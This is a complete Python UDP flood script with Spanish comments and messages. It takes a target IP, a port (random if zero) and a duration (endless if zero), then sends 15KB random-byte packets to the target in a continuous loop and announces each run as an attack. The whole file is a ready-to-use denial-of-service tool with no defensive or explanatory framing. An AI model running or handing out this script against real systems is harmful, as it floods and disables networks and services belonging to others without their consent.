#!/usr/bin/python3
import socket
import random
import sys
import time

# Validar los argumentos pasados al script
if len(sys.argv) != 4:
    sys.exit('Uso: python3 f.py <ip> <port (0=random)> <length (0=forever)>')

def UDPFlood():
    try:
        # Leer y validar los argumentos
        ip = sys.argv[1]
        try:
            socket.inet_aton(ip)  # Validar que la IP sea válida
        except socket.error:
            sys.exit(f"Error: La IP '{ip}' no es válida.")

        port = int(sys.argv[2])
        if port < 0 or port > 65535:
            sys.exit("Error: El puerto debe estar entre 0 y 65535 (0 para aleatorio).")
        
        duration = int(sys.argv[3])
        if duration < 0:
            sys.exit("Error: El tiempo (length) debe ser 0 o un número positivo.")
        
        # Configuración inicial
        randport = port == 0  # Usar puerto aleatorio si el puerto es 0
        duration_end = time.time() + duration if duration > 0 else float('inf')
        
        print(f'Iniciando ataque UDP en {ip}:{port or "random"} por {duration or "infinito"} segundos...')
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(15000)  # Paquete de 15KB
        
        while time.time() < duration_end:
            target_port = random.randint(1, 65535) if randport else port
            try:
                sock.sendto(bytes_to_send, (ip, target_port))
            except Exception as e:
                print(f"Error al enviar paquete: {e}")
                break

        print("Ataque terminado.")
    except KeyboardInterrupt:
        print("\nAtaque interrumpido por el usuario.")
    except Exception as e:
        print(f"Error inesperado: {e}")

# Ejecutar la función principal
if __name__ == "__main__":
    UDPFlood()
